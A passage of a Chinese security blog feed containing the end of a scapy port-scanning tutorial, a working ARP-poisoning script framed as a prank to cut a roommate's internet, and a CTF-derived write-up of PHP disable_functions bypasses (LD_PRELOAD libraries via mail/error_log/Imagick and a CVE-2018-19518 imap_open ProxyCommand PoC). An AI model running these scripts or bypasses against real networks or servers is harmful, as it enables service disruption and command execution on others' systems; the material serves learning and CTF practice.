punctuation">,</span>flags<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send <span class="token keyword">is</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"[+] %s  %d \033[91m Open | filtered\033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span>        <span class="token keyword">elif</span> send<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span><span class="token string">"TCP"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> send<span class="token punctuation">[</span><span class="token string">"TCP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flags<span class="token operator">==</span><span class="token string">"RA"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"[+] %s %d \033[92m Closed \033[0m"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    scan<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>扫描结果</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405233112-d7d95022-57b7-1.png" alt="image.png"></p><h2 id="TCP-FIN扫描"><a href="#TCP-FIN扫描" class="headerlink" title="TCP FIN扫描"></a>TCP FIN扫描</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>在发送的数据包中只设置FIN标志位，如果目标端口是开放的则不会回复任何信息。如果目标端口关闭则会返回一个RST+ACK的数据包</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234817-3ad8f086-57ba-1.png" alt="image.png"></p><h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><blockquote><p>nmap -sF模式</p></blockquote><p><strong> 将TCP Null扫描发送的标志位改为F即可 </strong></p><pre class=" language-python"><code class="language-python">send<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"F"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>扫描结果：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234608-ee3ee0fa-57b9-1.png" alt="image.png"></p><h2 id="TCP-Xmas扫描"><a href="#TCP-Xmas扫描" class="headerlink" title="TCP Xmas扫描"></a>TCP Xmas扫描</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>在发送的数据包中设置PSH,FIN,URG标志位，如果目标端口是开放的则不会回复任何信息。如果目标端口关闭则会返回一个RST+ACK的数据包</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405235057-9a0536be-57ba-1.png" alt="image.png"></p><h3 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h3><blockquote><p>nmap -sX模式</p></blockquote><p><strong> 将TCP Null扫描发送的标志位改为PFU即可 </strong></p><pre class=" language-python"><code class="language-python">send<span class="token operator">=</span>sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>host<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span>port<span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"PFU"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>扫描结果</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405234723-1ae01804-57ba-1.png" alt="image.png"></p><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p>emmmm，这个好像和标题没有什么关系，但是还是挺好用的，所以这里就简单地提及一下。</p><h2 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h2><p>我们还可以用scapy写一个ARP扫描的小脚本，代码实现如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> getopt<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">scan</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"-h:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span>arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-h"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            host<span class="token operator">=</span>arg    arp<span class="token operator">=</span>Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span><span class="token operator">/</span>ARP<span class="token punctuation">(</span>pdst<span class="token operator">=</span>host<span class="token punctuation">)</span>    ans<span class="token punctuation">,</span>unans<span class="token operator">=</span>srp<span class="token punctuation">(</span>arp<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"[+] Scaned %d host"</span><span class="token operator">%</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Host      MAC"</span>    <span class="token keyword">for</span> s<span class="token punctuation">,</span>h <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"{}      {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>h<span class="token punctuation">[</span><span class="token string">"ARP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>psrc<span class="token punctuation">,</span>h<span class="token punctuation">[</span><span class="token string">"ARP"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    scan<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>扫描结果如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405095129-545b4d58-5745-1.png" alt="image.png"></p><h2 id="ARP断网攻击"><a href="#ARP断网攻击" class="headerlink" title="ARP断网攻击"></a>ARP断网攻击</h2><h3 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h3><p>使用Scapy可以实现一个局域网的ARP投毒攻击，使对方断网，<strong> 整蛊一下舍友还是不错的23333 </strong><br>主机A（目标IP）：192.168.163.128<br>主机B（本机IP）：192.168.163.132<br>网关地址： 192.168.163.2</p><p>其实这个攻击原理也很简单，就是B主机告诉A主机我就是网关，然后A主机就会傻傻地相信B主机就是网关，就会把数据通过B主机转发出去给外网，如果B主机没有开启转发功能，流量就转发不出去，就会造成断网。</p><h3 id="实现-6"><a href="#实现-6" class="headerlink" title="实现"></a>实现</h3><p>代码实现：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> getopt<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token punctuation">:</span>    opts<span class="token punctuation">,</span> args <span class="token operator">=</span> getopt<span class="token punctuation">.</span>getopt<span class="token punctuation">(</span>argv<span class="token punctuation">,</span> <span class="token string">"-h:-m:"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> opt<span class="token punctuation">,</span>arg <span class="token keyword">in</span> opts<span class="token punctuation">:</span>        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-h"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            host<span class="token operator">=</span>arg        <span class="token keyword">if</span> opt <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">"-m"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            Bcast<span class="token operator">=</span>arg    <span class="token keyword">print</span> <span class="token string">"[+]: Status: \033[91m Attacking \033[0m"</span>    <span class="token keyword">print</span> <span class="token string">"[+]: Host: \033[92m %s \033[0m"</span><span class="token operator">%</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>    pkt <span class="token operator">=</span> ARP<span class="token punctuation">(</span>psrc<span class="token operator">=</span>Bcast<span class="token punctuation">,</span> pdst<span class="token operator">=</span>host<span class="token punctuation">,</span> op<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    srloop<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    attack<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>可以发现目标机已经连不上外网了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190405084903-9b89eff8-573c-1.png" alt="image.png"></p><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><p>防范也很简单，将网关的IP和MAC地址的关系绑定写入arp缓存表即可，具体怎么操作百度就有了，我这里就不多赘述了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然我列举的那些例子用Nmap和其它工具都能实现，但是我们不能总是做一个脚本小子和伸手党，多分析别人的工具是怎么实现这个功能的，然后自己尝试看看自己能不能编写一个这样类似的工具出来，多锻炼自己的动手能力。</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://nmap.org/man/zh/man-port-scanning-techniques.html" title="https://nmap.org/man/zh/man-port-scanning-techniques.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-port-scanning-techniques.html</a><br><a href="https://scapy.readthedocs.io/en/latest/usage.html" title="https://scapy.readthedocs.io/en/latest/usage.html" target="_blank" rel="noopener">https://scapy.readthedocs.io/en/latest/usage.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bypass-disabled_functions一些思路总结</title>
      <link href="/2019/04/04/Bypass-disabled-functions%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
      <url>/2019/04/04/Bypass-disabled-functions%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>文章首发于先知社区<a href="https://xz.aliyun.com/t/4623" target="_blank" rel="noopener">https://xz.aliyun.com/t/4623</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用</p><h1 id="Bypass思路"><a href="#Bypass思路" class="headerlink" title="Bypass思路"></a>Bypass思路</h1><h2 id="利用LD-PRELOAD"><a href="#利用LD-PRELOAD" class="headerlink" title="利用LD_PRELOAD"></a>利用LD_PRELOAD</h2><p>什么是LD_PRELOAD</p><pre><code>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</code></pre><p>简单来说就是<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用</p><h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>光看概念估计你可能会很懵，我们来写一个简单的demo来了解一下啥是<code>LD_PRELOAD</code><br>首先我们先写一个id.c，内容如下：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>uid_t <span class="token function">geteuid</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>uid_t <span class="token function">getuid</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>uid_t <span class="token function">getgid</span><span class="token punctuation">(</span> <span class="token keyword">void</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><p>执行一波</p><pre><code>qiyou@ubuntu:~/Desktop$ iduid=1000(qiyou) gid=1000(qiyou) groups=1000(qiyou)....qiyou@ubuntu:~$ whoamiqiyouqiyou@ubuntu:~/Desktop$ gcc -shared -o id.so id.cqiyou@ubuntu:~/Desktop$ export LD_PRELOAD=./id.soqiyou@ubuntu:~/Desktop$ iduid=0(root) gid=0(root) egid=1000(qiyou)....qiyou@ubuntu:~/Desktop$ whoamiroot</code></pre><p>可以看到uid和gid都变为了0，权限也变为了root</p><p>我们可以用ldd查询一下依赖关系，可以发现id.so(我们编译的动态链接库)在其它动态链接库之前提前被加载了，也就是说我们的恶意代码中的函数覆盖了原本的动态链接库的函数</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330005303-1e7ffcda-5243-1.png" alt="image.png"></p><h3 id="配合putenv-mail"><a href="#配合putenv-mail" class="headerlink" title="配合putenv+mail"></a>配合putenv+mail</h3><p>putenv官方手册是这么解释的：</p><pre><code>putenv ( string $setting ) : bool添加setting到服务器环境。环境变量仅在当前请求的持续时间内存在。在请求结束时，环境将恢复到其原始状态。</code></pre><p>如果该函数未被ban掉的话，即使是禁用了其它常见的函数，也可能会导致rce<br>我们可以按照如下步骤：</p><ol><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>Getshell</li></ol><p>那么php中的某个函数怎么去找呢，参考了<a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" title="该文章" target="_blank" rel="noopener">该文章</a>，发现mail()函数可以使用，而mail()函数执行默认是会调用外部程序sendmail的，看一下php.ini就会发现默认调用<code>sendmail -t -i</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330011754-96d9fcb4-5246-1.png" alt="image.png"></p><blockquote><p>PS：如果没有安装sendmail的话可以用<code>apt-get install sendmail</code>安装sendmail</p></blockquote><p>我们可以用strace查看一下mail函数调用的过程，可以很明显看出来执行了<code>sendmail -t -i</code><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330023106-d0f82628-5250-1.png" alt="image.png"></p><p>然后我们可以使用 <code>readelf -Ws /usr/sbin/sendmail</code> 可以查看senmail都调用了哪一些函数，然后从中选几个即可，这里我们选择<code>getuid</code></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330013011-4deed608-5248-1.png" alt="image.png"><br>然后就可以编写我们的动态连接程序<br>test.c</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls > test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>   <span class="token keyword">int</span>  <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后生成我们的动态链接程序</p><pre class=" language-sh"><code class="language-sh">gcc -c -fPIC test.c -o testgcc --share test -o test.so</code></pre><p>然后编写php脚本mail.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./test.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mail</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>执行一波，然后用strace查看调用过程是否执行了我们的<code>ls &gt; test</code>，可以发现成执行了我们的命令</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030422-76438ea2-5255-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330025044-8eb6eefe-5253-1.png" alt="image.png"></p><h3 id="配合putenv-error-log"><a href="#配合putenv-error-log" class="headerlink" title="配合putenv+error_log"></a>配合putenv+error_log</h3><p>0ctf2019的<code>Wallbreaker Easy</code>中ban了mail函数，但是<code>error_log</code>没有ban掉，故我们可以用<code>error_log</code>来bypass disabled_functions</p><p>error_log的一些参数</p><pre><code>error_log(error,type,destination,headers)当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址</code></pre><p>编写php脚本，动态链接文件同上，error_log调用的过程中（当type为1时）和mail函数一样，也会调用sendmail，</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./test.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_log</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030223-2f5a5796-5255-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330030310-4b46e942-5255-1.png" alt="image.png"></p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330090346-ab7e1f1a-5287-1.png" alt="image.png"></p><h2 id="利用ImageMagick"><a href="#利用ImageMagick" class="headerlink" title="利用ImageMagick"></a>利用ImageMagick</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这个搭建环境有一丝丝繁琐，不过没关系，按照我以下步骤来应该问题不大QAQ</p><pre class=" language-sh"><code class="language-sh">1：apt-get update&&apt-get install imagemagick2：convert -version //如果安装成功会返回imagemagick版本号</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330121909-f6e6dfbc-52a2-1.png" alt="image.png"></p><p>安装几个依赖</p><pre><code>apt-get install php-pear php-devapt-get install libmagickwand-dev</code></pre><p>下载以及安装imagick</p><pre class=" language-sh"><code class="language-sh">1.wget http://pecl.php.net/get/imagick-3.4.3.tgz2.tar -zxvf imagick-3.4.3.tgz3.phpize4.  ./configure --with-php-config=/usr/bin/php-config --with-imagick=/usr/local/imagemagick //注意php-config可能会不同，要根据你具体的情况来修改5.make&&make install6.改一波php.ini，随便一行添加：extension = imagick.so7.然后php -r "phpinfo();"|grep imagick，看有没有安装成功</code></pre><p>成功安装<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330122537-de3708b0-52a3-1.png" alt="image.png"></p><p>然后安装ffmpeg</p><pre class=" language-sh"><code class="language-sh">apt-get install ffmpegffmpeg -v 看看是否安装成功</code></pre><p>成功安装<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330122857-55adcbd6-52a4-1.png" alt="image.png"></p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>那么我们应该如何利用呢，参考了飘零师傅的分析，可以知道当Imagick处理的文件是如下后缀的时候，就会调用外部程序ffmpeg去处理该文件</p><pre><code>wmv,mov,m4v,m2v,mp4,mpg,mpeg,mkv,avi,3g2,3gp</code></pre><p>我们来写一个小demo来验证一下是否正确<br>img.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string">'img.mp4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//img.mp4文件必须存在，否则就会不去调用ffmpeg</span><span class="token delimiter">?></span></code></pre><p>我们strace一下看看执行的过程，可以发现在执行的过程中调用了ffmpeg</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330123601-52125e32-52a5-1.png" alt="image.png"></p><h3 id="配合-attribute-函数"><a href="#配合-attribute-函数" class="headerlink" title="配合__attribute__函数"></a>配合<code>__attribute__</code>函数</h3><p><strong> PS: <code>__attribute__</code>的介绍</strong></p><pre><code>__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数__attribute__语法格式为：__attribute__ ( ( attribute-list ) )若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</code></pre><p>我们可以知道当该函数为<code>__attribute__((__constructor__))</code>的时候，会在main（）函数执行之前被自动的执行<br>所以我们尝试构造poc.c</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">angel</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls > test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后生成我们的动态链接程序</p><pre class=" language-sh"><code class="language-sh">gcc -c -fPIC poc.c -o pocgcc --share poc -o poc.so</code></pre><p>img.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD=./poc.so"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$img</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Imagick</span><span class="token punctuation">(</span><span class="token string">'img.mp4'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>运行一波，发现我们的命令执行成功了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330131614-f0c0b768-52aa-1.png" alt="image.png"></p><h2 id="利用imap-open-CVE-2018-19518"><a href="#利用imap-open-CVE-2018-19518" class="headerlink" title="利用imap_open (CVE-2018-19518)"></a>利用imap_open (CVE-2018-19518)</h2><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p><p><strong> ssh的-oProxyCommand 参数 </strong><br>SSH 命令中用到了许多命令，其中我们可以使用 -o 参数来设置连接期间可用的各种选项。在建立SSH连接之前，我们可以设置 <code>ProxyCommand</code>参数，如下所示：</p><pre class=" language-sh"><code class="language-sh">qiyou@ubuntu:~/test$ lsqiyou@ubuntu:~/test$ ssh -oProxyCommand="touch test.txt" 192.168.1.123ssh_exchange_identification: Connection closed by remote hostqiyou@ubuntu:~/test$ lstest.txt</code></pre><p>可以发现即使是ssh连接失败了，但是命令还是执行了。</p><p><code>CVE-2018-19518</code>的环境可以直接使用vulhub上的环境：<a href="https://github.com/vulhub/vulhub/tree/master/php/CVE-2018-19518" title="链接" target="_blank" rel="noopener">链接</a></p><p>直接上poc</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string">"echo test!test! > /tmp/test"</span><span class="token punctuation">;</span><span class="token variable">$base64_exp</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$server</span> <span class="token operator">=</span> <span class="token string">"x -oProxyCommand=echo\t${base64_exp}|base64\t-d|sh}"</span><span class="token punctuation">;</span><span class="token function">imap_open</span><span class="token punctuation">(</span><span class="token string">'{'</span><span class="token punctuation">.</span><span class="token variable">$server</span><span class="token punctuation">.</span><span class="token string">':143/imap}INBOX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"\n\nError: "</span><span class="token punctuation">.</span><span class="token function">imap_last_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>执行一波，可以发现执行成功了，要想写webshell的话直接把我们的exp改一下就ok了，这里就不多赘述了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330100258-f0e06182-528f-1.png" alt="image.png"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>被0ctf锤哭了，膜RR师傅Orz，比赛的时候没有做出来，赛后没有时间复现，等到想要复现的时候环境已经关了，只能是本地复现了，顺便总结了一下。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190330134911-8ad0aa9e-52af-1.png" alt="image.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" title="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a><br><a href="https://www.jianshu.com/p/137ae1400337" title="https://www.jianshu.com/p/137ae1400337" target="_blank" rel="noopener">https://www.jianshu.com/p/137ae1400337</a><br><a 